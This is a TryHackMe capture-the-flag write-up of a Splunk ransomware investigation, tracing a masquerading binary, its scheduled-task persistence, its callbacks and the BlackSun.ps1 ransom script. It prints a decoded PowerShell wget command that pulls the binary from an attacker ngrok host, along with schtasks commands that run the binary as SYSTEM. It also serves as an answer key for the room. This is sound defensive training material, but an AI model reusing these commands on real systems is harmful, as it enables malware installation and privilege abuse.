# TryHackMe: PS Eclipse

**Category:** SOC / Ransomware Investigation
**Tooling:** Splunk
**Techniques:** Sysmon network connection analysis, PowerShell Base64 decoding, scheduled task persistence detection, IOC/hash lookups via VirusTotal

---

## Overview

As an SOC analyst for MSSP "TryNotHackMe," this investigation covers a reported ransomware attempt on Keegan's machine. Using Splunk-ingested Sysmon and PowerShell logs, the investigation traces a suspicious binary's download via an obfuscated PowerShell command, its persistence mechanism via scheduled tasks, its C2 callback, and a follow-up malicious script (`BlackSun.ps1`) responsible for dropping a ransom note and replacing the desktop wallpaper.

---

## 2. Investigation

### Q1 — Name of the suspicious binary downloaded to the endpoint

Searched for the destination IP to trace where outbound data was going; found the answer in the first matching Sysmon event.

**Relevant Sysmon event (EventCode=3 — Network connection detected):**
```
RuleName: technique_id=T1036,technique_name=Masquerading
Image: C:\Windows\Temp\OUTSTANDING_GUTTER.exe
DestinationIp: 3.17.7.232
DestinationPort: 443
```

**Answer:**
```
OUTSTANDING_GUTTER.exe
```

---

### Q2 — Address the binary was downloaded from

Located the PowerShell command-line output, which contained a Base64-encoded command. Decoding revealed the download source.

**Decoded command (relevant portion):**
```
wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe
```

**Answer (defanged):**
```
hxxp[://]886e-181-215-214-32[.]ngrok[.]io
```

---

### Q3 — Windows executable used to download the suspicious binary

Identified via the parent image field in the process creation event.

**Answer:**
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

---

### Q4 — Command used to configure the binary for elevated-privilege execution

**Answer:**
```
"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f
```

---

### Q5 — Permissions and command used to run the binary with elevated privileges

**Answer (format: User;CommandLine):**
```
NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe
```

---

### Q6 — Remote server the suspicious binary connected to

Found in the DNS query name field of subsequent network connection events.

**Answer (defanged):**
```
hxxp[://]9030-181-215-214-32[.]ngrok[.]io
```

---

### Q7 — Name of the PowerShell script downloaded to the same location

Searched for files with a `.ps1` extension written to the same directory as the binary.

**Answer:**
```
script.ps1
```

---

### Q8 — Actual name of the malicious script (flagged by AV)

Pulled the file hash (`3EBAB71CB71CA5C475202F401DE008C8`) and looked it up on **VirusTotal** to confirm the script's true identity.

**Answer:**
```
BlackSun.ps1
```

---

### Q9 — Full path of the saved ransom note

**Answer:**
```
C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt
```

---

### Q10 — Full path of the wallpaper image saved by the script

Located by searching for the keyword "blacksun" across file write events.

**Answer:**
```
C:\Users\Public\Pictures\blacksun.jpg
```

---

## Key Lesson

This room reinforces the value of decoding obfuscated PowerShell (`-enc`/Base64) command lines rather than treating them as unreadable noise — the entire download URL, destination path, and scheduled task persistence mechanism were hidden in a single encoded blob. It also shows a two-stage attack pattern: an initial masquerading binary (`OUTSTANDING_GUTTER.exe`, named to blend in) establishes persistence via `schtasks` tied to an event-log trigger (`EventID=777`) rather than a simple time-based schedule, then pulls down a second-stage script (`BlackSun.ps1`) that performs the actual ransomware-style actions (ransom note + wallpaper change) — a good example of why tracking the full chain from initial dropper to final payload matters more than flagging any single IOC in isolation.
